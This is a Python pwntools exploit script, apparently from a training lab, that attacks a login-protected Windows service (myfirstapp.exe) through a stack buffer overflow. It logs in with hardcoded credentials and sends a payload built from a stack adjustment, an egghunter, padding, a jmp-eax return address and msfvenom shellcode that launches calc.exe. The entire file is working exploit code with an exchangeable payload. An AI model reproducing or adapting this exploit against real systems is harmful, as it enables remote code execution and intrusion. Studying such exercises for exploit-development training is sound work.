#!/usr/bin/python3
from pwn import sys, log, remote, p32, asm

if len(sys.argv) != 2:
    log.failure(f"Usage: python3 {sys.argv[0]} <port>")
    sys.exit(1)

subesp = asm("sub esp, 0x64")

# !py mona egghunter -wow64
egg = b"w00t" * 2

egghunter  = b""
egghunter += b"\x31\xd2\x66\x81\xca\xff\x0f\x31\xdb\x42"
egghunter += b"\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3"
egghunter += b"\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4"
egghunter += b"\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74"
egghunter += b"\x89\xd7\xaf\x75\xda\xaf\x75\xd7\xff\xe7"

# !py mona pattern_offset eip
offset = 66
junk = b"A" * (offset - len(subesp + egghunter))

# !py mona jmp -r eax -m myfirstapp.exe
jmpeax = p32(0x719023b3)

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00'
shellcode =  b""
shellcode += b"\xbf\x1c\x81\x88\x34\xda\xd6\xd9\x74\x24\xf4"
shellcode += b"\x5d\x29\xc9\xb1\x31\x31\x7d\x13\x83\xed\xfc"
shellcode += b"\x03\x7d\x13\x63\x7d\xc8\xc3\xe1\x7e\x31\x13"
shellcode += b"\x86\xf7\xd4\x22\x86\x6c\x9c\x14\x36\xe6\xf0"
shellcode += b"\x98\xbd\xaa\xe0\x2b\xb3\x62\x06\x9c\x7e\x55"
shellcode += b"\x29\x1d\xd2\xa5\x28\x9d\x29\xfa\x8a\x9c\xe1"
shellcode += b"\x0f\xca\xd9\x1c\xfd\x9e\xb2\x6b\x50\x0f\xb7"
shellcode += b"\x26\x69\xa4\x8b\xa7\xe9\x59\x5b\xc9\xd8\xcf"
shellcode += b"\xd0\x90\xfa\xee\x35\xa9\xb2\xe8\x5a\x94\x0d"
shellcode += b"\x82\xa8\x62\x8c\x42\xe1\x8b\x23\xab\xce\x79"
shellcode += b"\x3d\xeb\xe8\x61\x48\x05\x0b\x1f\x4b\xd2\x76"
shellcode += b"\xfb\xde\xc1\xd0\x88\x79\x2e\xe1\x5d\x1f\xa5"
shellcode += b"\xed\x2a\x6b\xe1\xf1\xad\xb8\x99\x0d\x25\x3f"
shellcode += b"\x4e\x84\x7d\x64\x4a\xcd\x26\x05\xcb\xab\x89"
shellcode += b"\x3a\x0b\x14\x75\x9f\x47\xb8\x62\x92\x05\xd6"
shellcode += b"\x75\x20\x30\x94\x76\x3a\x3b\x88\x1e\x0b\xb0"
shellcode += b"\x47\x58\x94\x13\x2c\x96\xde\x3e\x04\x3f\x87"
shellcode += b"\xaa\x15\x22\x38\x01\x59\x5b\xbb\xa0\x21\x98"
shellcode += b"\xa3\xc0\x24\xe4\x63\x38\x54\x75\x06\x3e\xcb"
shellcode += b"\x76\x03\x5d\x8a\xe4\xcf\x8c\x29\x8d\x6a\xd1"

payload  = b""
payload += subesp + egghunter + junk + jmpeax
payload += b"A" * 4
payload += egg + shellcode

shell = remote("Windows", sys.argv[1])

shell.sendlineafter(b"Username: ", b"alfiansyah")
shell.sendlineafter(b"Password: ", b"K3r4j@@nM4j@pAh!T")
shell.sendlineafter(b"FullName: ", b"Vickry Alfiansyah")
shell.sendlineafter(b"Input Your Code: ", payload)
